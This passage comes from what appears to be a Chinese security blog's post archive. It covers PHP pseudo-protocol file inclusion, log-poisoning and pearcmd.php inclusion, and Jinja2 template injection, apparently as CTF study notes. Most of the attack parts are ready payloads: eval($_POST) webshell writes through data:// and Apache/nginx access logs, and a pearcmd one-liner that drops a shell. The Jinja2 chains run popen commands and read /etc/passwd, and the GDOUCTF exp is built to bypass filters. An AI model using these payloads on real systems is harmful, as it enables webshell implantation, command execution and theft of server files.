+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#格式: convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt;</span></span><br><span class="line"><span class="comment">#&lt;input-encoding&gt;和&lt;output-encoding&gt;有以下几种:</span></span><br><span class="line"><span class="comment">#UCS-4*			UCS-4BE			UCS-4LE*			UCS-2			UCS-2BE			UCS-2LE</span></span><br><span class="line"><span class="comment">#UTF-32*		UTF-32BE*		UTF-32LE*			UTF-16*			UTF-16BE*		UTF-16LE*</span></span><br><span class="line"><span class="comment">#UTF-7			UTF7-IMAP		UTF-8*				ASCII*</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.iconv.UCS-2.UCS-2LE/resource=data://text/plain,abcd&quot;</span>);</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+<li><p>压缩过滤器：zlib.deflate压缩&amp;zlib.inflate解压、bzip2.compress压缩&amp;bzip.decompress解压</p>
+</li>
+<li><p>加密过滤器：特别适用于文件或数据流的加密，自PHP7.1.0起废弃。</p>
+</li>
+</ul>
+<p>参考文章：</p>
+<p>[php filter伪协议 - Tranquility](<a href="https://leekosss.github.io/2023/08/24/php">https://leekosss.github.io/2023/08/24/php</a> filter伪协议&#x2F;#convert-iconv)</p>
+<h2 id="data-协议"><a href="#data-协议" class="headerlink" title="data://协议"></a><code>data://</code>协议</h2><p><code>data://</code>伪协议是一种特殊的协议，用于在PHP中将数据以流的形式处理。它属于PHP的<em>Stream Wrapper</em> 机制的一部分，允许开发者通过类似文件的方式操作数据，而无需依赖实际的文件系统或外部资源。</p>
+<p>作用：该伪协议允许开发者将任意数据作为流来读取或写入。使用前提：<strong>allow_url_fopen ：on且allow_url_include：on</strong></p>
+<p>下面是一个例子，来理解该协议</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$stream</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;data://text/plain,Hello World!&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="variable">$fr</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$stream</span>,<span class="number">12</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$stream</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$fr</span>;</span><br><span class="line"><span class="comment">#输出:</span></span><br><span class="line"><span class="comment">//Hello World!</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="file"><a href="#file" class="headerlink" title="file://"></a><code>file://</code></h4><p>用来读取本地服务器上的文件。</p>
+<h4 id="data"><a href="#data" class="headerlink" title="data://"></a><code>data://</code></h4><p>**<code>data://text/plain</code>**是_PHP_ 中<code>file_get_contents</code>函数支持的一种特殊协议，用于将字符串作为文件内容来处理。在<code>data://</code>协议后面，可以指定_MIME_ 类型（在这里是<code>text/plain</code>），然后是逗号和数据本身。数据可以是任何有效的字符串，它将被当作文件内容来读取。</p>
+<p>php5.2.0起，如果传入的数据是PHP代码，就会<strong>执行代码</strong>。使用方法：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">data://text/plain;<span class="built_in">base64</span>,payload</span><br><span class="line"><span class="comment"># payload是base64编码后的代码</span></span><br></pre></td></tr></table></figure>
+
+<p>下面给出一个例子：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;This is a demo.\n&quot;</span>;</span><br><span class="line"><span class="variable">$stream</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;data://text/plain,&#x27;</span>.<span class="variable">$a</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="variable">$fa</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$stream</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$stream</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$fa</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$stream</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;data://text/plain,Hello World!&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="variable">$fr</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$stream</span>,<span class="number">12</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$stream</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$fr</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//    输出结果</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">This is a demo.</span></span><br><span class="line"><span class="comment">Hello World!</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    </span><br><span class="line">    http:<span class="comment">//2c421d36-abcf-46cb-9985-dc13ad0966a4.node4.buuoj.cn:81/?url=data:text/plain,&#x27;&lt;?php @eval($_POST[&#x27;capt&#x27;])?&gt;&#x27;&amp;filename=upload/test.php</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong><code>data://</code>结合<code>SSRF</code>，绕过<code>GET</code>命令</strong></li>
+</ul>
+<p>​	<code>GET</code> 是一个命令行工具，通常用于从网络上获取资源。它类似于 <code>curl</code>或 <code>wget</code>，例如，<code>GET http://example.com</code> 会从 <code>http://example.com</code> 获取内容。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">--- ?url=data:text/plain,<span class="string">&#x27;&lt;?php @eval($_POST[&quot;sh&quot;])?&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;GET &quot;</span> . <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]));</span><br><span class="line">@<span class="title function_ invoke__">file_put_contents</span>(exp.php, <span class="variable">$data</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这样就成功的将木马写入文件中，并使其起作用。</p>
+<h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a><code>php://input</code></h4><p>​	当请求方式是<code>POST</code>的，并且**<code>enctpy</code>不等于<code>multipart/form-data</code>**时，可以使用<code>php://input</code>来获取原始请求的数据。如下会将通过<code>POST</code>方式提交的数据直接赋值给<code>$body</code>。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$body</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);    <span class="comment">//变量body利用php://input伪协议获取post数据</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a><code>file_get_contents()</code></h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;2333&#x27;</span>])===<span class="string">&quot;today is a happy day&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>​	<code>hackbar</code>直接传入<code>?2333=data://text/plain,today is a happy day&amp;file=flag</code>即可，如用<code>bp</code>则参数中的空格要<code>url</code>编码</p>
+<p>​	本来在网上看<code>php://input</code>也行的（在<code>enctype</code>不为<code>multipart/from-data</code>的前提下），但试了好久，都没成功，发现是传入的<code>POST</code>内容需要变量名，但是给了变量名又会把**变量名&#x3D;<strong>也带上，而且里面的空格都用</strong>+**替代了。看其他师傅的文章中都没出现过这个问题，真的好奇怪😤</p>
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>web安全</tag>
+        <tag>文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>裸文件包含</title>
+    <url>/2025/02/08/%E8%A3%B8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
+    <content><![CDATA[<p>[TOC]</p>
+<span id="more"></span>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;file://&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="日志文件包含利用"><a href="#日志文件包含利用" class="headerlink" title="日志文件包含利用"></a>日志文件包含利用</h2><p>前置知识：</p>
+<blockquote>
+<p>Apache服务器运行后会生成两个日志文件，这两个文件是access.log(访问日志)和error.log(错误日志)，apache的日志文件记录下我们的操作，并且写到访问日志文件access.log之中。</p>
+</blockquote>
+<p>注意：因为浏览器会将url中的一些字符进行urlencode编码，为了不让记录到access.log中的内容被编码，要用bp抓包写入payload并发送。</p>
+<p>以上面提到的漏洞代码为例，假设漏洞文件为exp.php：</p>
+<p>payload</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/<span class="meta">&lt;?php</span> <span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;1.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>);<span class="title function_ invoke__">fputs</span>(<span class="variable">$fp</span>,<span class="string">&#x27;&lt;?php @eval($_POST[1])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>bp发送上面payload，然后访问exp.php?file&#x3D;<strong>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</strong>，便会在exp.php同目录下生成1.php文件，其内含我们写入的马，蚁剑连接<a href="http://192.168.1.9/exp.php?file=1.php%E5%8D%B3%E5%8F%AF%E3%80%82">http://192.168.1.9/exp.php?file=1.php即可。</a></p>
+<h2 id="pearcmd-php的利用"><a href="#pearcmd-php的利用" class="headerlink" title="pearcmd.php的利用"></a>pearcmd.php的利用</h2><p>注意：</p>
+<ol>
+<li><strong>该攻击方法的前提是php开启了register_argc_argv。</strong></li>
+<li>Docker中pearcmd.php的默认在&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;路径下。</li>
+</ol>
+<p>pear命令有一个参数是config-create，而这个命令又需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。</p>
+<p>同样以上面的漏洞代码为例，还是要用bp，不过这次注意要在把包给到Repeater前修改参数。</p>
+<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">+config-create+<span class="regexp">/&amp;file=/usr</span><span class="regexp">/local/lib</span><span class="regexp">/php/pearcmd</span>.php&amp;&lt;<span class="string">?=</span><span class="variable">@eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>])<span class="string">?&gt;</span>+<span class="regexp">/tmp/a</span>.php</span><br></pre></td></tr></table></figure>
+
+<p>参考文章：</p>
+<p><a href="https://blog.csdn.net/weixin_45588247/article/details/119401092">【文件包含漏洞】——文件包含漏洞进阶_日志文件包含利用_文件包含漏洞 apache日志-CSDN博客</a></p>
+<p><a href="https://www.cnblogs.com/endermanneer/p/18186330">利用pearcmd实现裸文件包含 - endermanneer - 博客园</a></p>
+<p><a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp">Docker PHP裸文件本地包含综述 | 离别歌</a></p>
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>web安全</tag>
+        <tag>文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>jinja2模板注入总结</title>
+    <url>/2024/12/18/jinja2%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<p>Jinja2模板注入是一种安全漏洞，发生在使用Jinja2模板引擎的Web应用程序中。当应用程序将用户输入直接嵌入到模板渲染过程中，且未对输入进行适当的过滤或验证时，攻击者可以注入恶意的模板代码。这些恶意代码可能会被Jinja2引擎执行，从而导致未经授权的操作，例如读取服务器文件、执行系统命令或窃取敏感信息。这种漏洞类似于传统的代码注入攻击，但针对的是模板引擎的语法和功能。</p>
+<span id="more"></span>
+
+<h2 id="相关函数总结"><a href="#相关函数总结" class="headerlink" title="相关函数总结"></a>相关函数总结</h2><p>listdir(“&#x2F;“)函数列出目录文件</p>
+<p>open(“flag”,”r”).read()打开文件并读取</p>
+<p>eval将字符串作为代码执行</p>
+<h3 id="两个内置函数"><a href="#两个内置函数" class="headerlink" title="两个内置函数"></a>两个内置函数</h3><p>get_flashed_messages、url_for</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%print(get_flashed_messages.__globals__.os[&quot;pop&quot;+&quot;en&quot;](&quot;ls&quot;).read())%&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config[&#x27;FLAG&#x27;]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="小trick"><a href="#小trick" class="headerlink" title="小trick"></a>小trick</h2><ol>
+<li><p><code>[&#39;__xxx__&#39;]</code>和<code>.__xxx__</code>其实没有区别，但是<code>[&#39;__xxx__&#39;]</code>可以通过拼接字符串的方式，绕过对xxx字符的过滤。还有<code>[&#39;xxx&#39;]</code>和<code>.xxx</code>。</p>
+</li>
+<li>查看配置文件，作为存储配置信息的变量`config`，这个类中的`__init__`函数全局变量中已经导入了`os`模块，我们可以直接调用。
+</li>
+<li><p>**_<em>getattribute</em>_()**函数可以拼接两个字符串，可将__init__写成<code>__getattribute__(&#39;__in&#39;+&#39;it__&#39;)</code>。</p>
+</li>
+<li><pre><code class="jinja2">&#123;&#123;config.__init__.__globals__.os.popen('env').read()&#125;&#125;
+&#123;&#123;config.__getattribute__('__in'+'it__').__globals__.os.popen('ls').read()&#125;&#125;
+&#123;&#123;a.__init__.__globals__['__builtins__'].eval('__import__("os").popen("env").read')&#125;&#125;
+&#123;&#123;b.__getattribute__('__in'+'it__').__globals__.__builtins__['__import__']('os').popen('ls').read()&#125;&#125;
+<figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## 对config做了限制</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>. 得到object类</span><br><span class="line"></span><br><span class="line">&gt; `[].__class__`：这会获取空列表（`[]`）的类，即 `list`。</span><br><span class="line">&gt;</span><br><span class="line">&gt; `__base__`：在Python <span class="number">3</span>中，这是获取对象的基类（即直接父类）的特殊属性。然而，`list` 的基类是 `object`，因为所有新式类都隐式继承自 `object`。</span><br><span class="line"></span><br><span class="line">```jinja2</span><br><span class="line">&#123;&#123;[].__class__.__base__&#125;&#125;</span><br><span class="line">&#123;# 过滤了class可以用下面这个，拼接字符串 #&#125;</span><br><span class="line">&#123;&#123;session[&#x27;__cla&#x27;+&#x27;ss__&#x27;].__bases__[<span class="number">0</span>].__bases__[<span class="number">0</span>].__bases__[<span class="number">0</span>]&#125;&#125;</span><br><span class="line">&#123;# 多少个__bases__[<span class="number">0</span>]自己试 #&#125;</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+<li><p>利用<code>__subclasses__</code>去访问<code>object</code>类下的所有子类</p>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</span><br><span class="line">&#123;&#123;session[&#x27;__class__&#x27;].__bases__[0].__bases__[0].__subclasses__()&#125;&#125;</span><br><span class="line">&#123;&#123;session[&#x27;__cla&#x27;+&#x27;ss__&#x27;].__bases__[0].__bases__[0][&#x27;__subcla&#x27;+&#x27;sses__&#x27;]()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>常见可利用的类：**&lt;class ‘os._wrap_close’&gt;<strong>，</strong>&lt;class ‘warnings.catch_warnings’&gt;<strong>，</strong>&lt;class ‘site._Printer’&gt;**</p>
+<ul>
+<li>**&lt;type ‘file’&gt;**，对文件操作的类，可以用来读取文件。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>确定一些类中是否含<code>os</code>模块、<code>__builtins__</code>模块</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;#查看71类下有什么#&#125;</span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__.__globals__&#125;&#125;</span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__.__globals__.os&#125;&#125;</span><br><span class="line">&#123;#查看__builtins__模块下有什么#&#125;</span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__.__globals__.__builtins__&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>含<code>os</code>模块，直接利用<code>os</code>中的<code>popen</code>函数</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;#利用popen函数查看目录，读取文件#&#125;</span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>不含<code>os</code>模块，如果含<code>__builtins__</code>模块，利用该模块下的<code>eval</code>函数导入<code>os</code>模块</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;#利用 eval函数执行命令#&#125;</span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__.__globals__.__builtins__.eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;xxx.eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="for循环遍历匹配"><a href="#for循环遍历匹配" class="headerlink" title="for循环遍历匹配"></a><code>for</code>循环遍历匹配</h3><p>遍历<code>object</code>类下的所有子类，匹配<code>catch_warnings</code>类</p>
+<h4 id="利用open函数读取文件"><a href="#利用open函数读取文件" class="headerlink" title="利用open函数读取文件"></a>利用<code>open</code>函数读取文件</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">	&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">		&#123;&#123; c.__init__.__globals__.__builtins__.open(&#x27;/etc/passwd&#x27;,&#x27;r&#x27;).read()&#125;&#125;</span><br><span class="line">	&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line">&#123;##&#125;</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">	&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">		&#123;&#123; c.__init__.[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;][&#x27;open&#x27;](&#x27;/etc/passwd&#x27;,&#x27;r&#x27;).read() &#125;&#125;</span><br><span class="line">	&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="import导入os模块利用"><a href="#import导入os模块利用" class="headerlink" title="import导入os模块利用"></a><code>import</code>导入<code>os</code>模块利用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">	&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">		&#123;&#123; c.__init__.__globals__.__builtins__[&#x27;__imp&#x27;+&#x27;ort__&#x27;](&#x27;o&#x27;+&#x27;s&#x27;).listdir(&#x27;/&#x27;)&#125;&#125;   &#123;# listdir函数列出 #&#125;</span><br><span class="line">	&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h2><p>&#96;&#96;&#96;&#96;&#96;</p>
+<ul>
+<li><p><code>|capitalize</code>是一个过滤器，会将<code>variable</code>的值通过<code>capitalize</code>方法处理后再输出。</p>
+</li>
+<li><p><code>capitalize</code>方法会将字符串的首字母大写，其他字母小写。</p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">template_string = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&#123;&#123;name|capitalize&#125;&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">template = Template(template_string)</span><br><span class="line">output = template.render(name=<span class="string">&quot;it&#x27;s Very Good!&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(output)   <span class="comment">#输出：It&#x27;s very good!</span></span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li><code>__mro__</code>：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</li>
+<li><code>__subclasses__</code>：返回当前类的子类，也可以通过索引的方式定位一个子类。</li>
+<li><code>__init__</code>：类的初始化方法。</li>
+</ul>
+<h4 id="join"><a href="#join" class="headerlink" title="|join"></a><code>|join</code></h4><p><code>|join</code>过滤器，用于将列表中的元素连接成一个字符串。</p>
+<ul>
+<li><code>__dict__</code>：保存类实例或对象实例的属性变量键值对字典</li>
+<li><code>__globals__</code>：对包含函数全局变量的字典的引用。</li>
+<li><code>__builtin__</code>：</li>
+</ul>
+<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="emphasis">__builtin__</span>&amp;&amp;<span class="emphasis">__builtins__</span>　　：python中可以直接运行一些函数，例如int()，list()等等。　　　　　　　　　　　　　　　　　　这些函数可以在<span class="emphasis">__builtin__</span>可以查到。查看的方法是dir(<span class="emphasis">__builtins__</span>)　　　　　　　　　　　　　　　　　　在py3中<span class="emphasis">__builtin__</span>被换成了builtin　　　　　　　　　　　　　　　　　　1.在主模块main中，<span class="emphasis">__builtins__</span>是对内建模块<span class="emphasis">__builtin__</span>本身的引用，即<span class="emphasis">__builtins__</span>完全等价于<span class="emphasis">__builtin__</span>。　　　　　　　　　　　　　　　　　　2.非主模块main中，<span class="emphasis">__builtins__</span>仅是对<span class="emphasis">__builtin__</span>.<span class="emphasis">__dict__</span>的引用，而非<span class="emphasis">__builtin__</span>本身</span><br></pre></td></tr></table></figure>
+
+<h3 id="GDOUCTF-2023"><a href="#GDOUCTF-2023" class="headerlink" title="[GDOUCTF 2023]"></a>[GDOUCTF 2023]<ez_ze></h3><p>过滤了<code>&#123;&#123;&#125;&#125;</code>，通过<code>&#123;% %&#125;</code>代替，还过滤了一些危险字符和字符串，我们只能自己设置和拼接了。</p>
+<h4 id="设置特殊字符"><a href="#设置特殊字符" class="headerlink" title="设置特殊字符"></a>设置特殊字符</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">print</span>(lipsum) %&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505102002607.png" alt="image-20241004190352946"></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">print</span>(lipsum|string|<span class="built_in">list</span>) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> pop=<span class="built_in">dict</span>(pop=<span class="number">1</span>)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> xhx=(lipsum|string|<span class="built_in">list</span>)|attr(pop)(<span class="number">18</span>) %&#125;  <span class="comment">#设置xhx为&#x27;_&#x27;下划线</span></span><br><span class="line">&#123;% <span class="built_in">set</span> kg=(lipsum|string|<span class="built_in">list</span>)|attr(pop)(<span class="number">9</span>) %&#125;  <span class="comment">#设置kg为&#x27; &#x27;空格</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505102002678.png" alt="image-20241004190630920"></p>
+<p>发现<code>lipsum</code>中缺少了我们需要的<code>/</code>字符，可以通过<code>config</code>设置，前两个字符在<code>config</code>中也能找到。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">print</span>(config) %&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505102001614.png" alt="image-20241004190120138"></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">print</span>(config|string|<span class="built_in">list</span>) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> xg=(config|string|<span class="built_in">list</span>)|attr(pop)(<span class="number">239</span>) %&#125;  <span class="comment">#设置xg为&#x27;/&#x27;斜杠</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505102001244.png" alt="image-20241004190604117"></p>
+<h4 id="拼接并设置关键字符串"><a href="#拼接并设置关键字符串" class="headerlink" title="拼接并设置关键字符串"></a>拼接并设置关键字符串</h4><p><code>|join</code>过滤器，用于将列表中的元素连接成一个字符串。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># xhx:_   kg:空格   xg:/</span></span><br><span class="line"><span class="comment">#设置globals为拼接后的 __globals__</span></span><br><span class="line">&#123;% <span class="built_in">set</span> gl=(xhx,xhx,<span class="built_in">dict</span>(glo=a,bals=b)|join,xhx,xhx)|join %&#125;</span><br><span class="line"><span class="comment">#设置gi为拼接后的 __getitem__</span></span><br><span class="line">&#123;% <span class="built_in">set</span> gi=(xhx,xhx,<span class="built_in">dict</span>(get=a,item=b)|join,xhx,xhx)|join %&#125;</span><br><span class="line"><span class="comment">#设置so为拼接后的 os</span></span><br><span class="line">&#123;% <span class="built_in">set</span> so=<span class="built_in">dict</span>(o=a,s=b)|join %&#125;</span><br><span class="line"><span class="comment">#设置pp为拼接后的 popen</span></span><br><span class="line">&#123;% <span class="built_in">set</span> pp=<span class="built_in">dict</span>(po=a,pen=b)|join %&#125;</span><br><span class="line"><span class="comment">#设置shell为拼接后的 cat /flag</span></span><br><span class="line">&#123;% <span class="built_in">set</span> shell=(<span class="built_in">dict</span>(cat=a)|join,kg,xg,<span class="built_in">dict</span>(flag=a)|join)|join %&#125;</span><br><span class="line"><span class="comment">#设置read为 read</span></span><br><span class="line">&#123;% <span class="built_in">set</span> re=<span class="built_in">dict</span>(re=a,ad=b)|join %&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="拼接payload"><a href="#拼接payload" class="headerlink" title="拼接payload"></a>拼接<code>payload</code></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload原型</span></span><br><span class="line">&#123;&#123;lipsum|attr(<span class="string">&#x27;__globals__&#x27;</span>)|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="string">&#x27;os&#x27;</span>)|attr(<span class="string">&#x27;popen&#x27;</span>)(<span class="string">&#x27;cat /flag&#x27;</span>)|attr(<span class="string">&#x27;read&#x27;</span>)()&#125;&#125;</span><br><span class="line"><span class="comment">#拼接payload</span></span><br><span class="line">&#123;% <span class="built_in">print</span>(lipsum|attr(<span class="built_in">globals</span>)|attr(gi)(so)|attr(pp)(shell)|attr(read)()) %&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>exp</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span>%0aop=<span class="built_in">dict</span>(op=<span class="number">1</span>)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span>%0axhx=(config|string|<span class="built_in">list</span>)|attr(op)(<span class="number">74</span>)%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span>%0akg=(config|string|<span class="built_in">list</span>)|attr(op)(<span class="number">7</span>)%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span>%0axg=(config|string|<span class="built_in">list</span>)|attr(op)(<span class="number">279</span>)%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span>%0agl=(xhx,xhx,<span class="built_in">dict</span>(glo=a,bals=b)|join,xhx,xhx)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span>%0agi=(xhx,xhx,<span class="built_in">dict</span>(get=a,item=b)|join,xhx,xhx)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span>%<span class="number">0</span>aso=<span class="built_in">dict</span>(o=a,s=b)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span>%0app=<span class="built_in">dict</span>(po=a,pen=b)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span>%<span class="number">0</span>ashell=(<span class="built_in">dict</span>(cat=a)|join,kg,xg,<span class="built_in">dict</span>(flag=a)|join)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span>%0ara=<span class="built_in">dict</span>(re=a,ad=b)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">print</span>(lipsum|attr(gl)|attr(gi)(so)|attr(pp)(shell)|attr(ra)())%&#125;</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
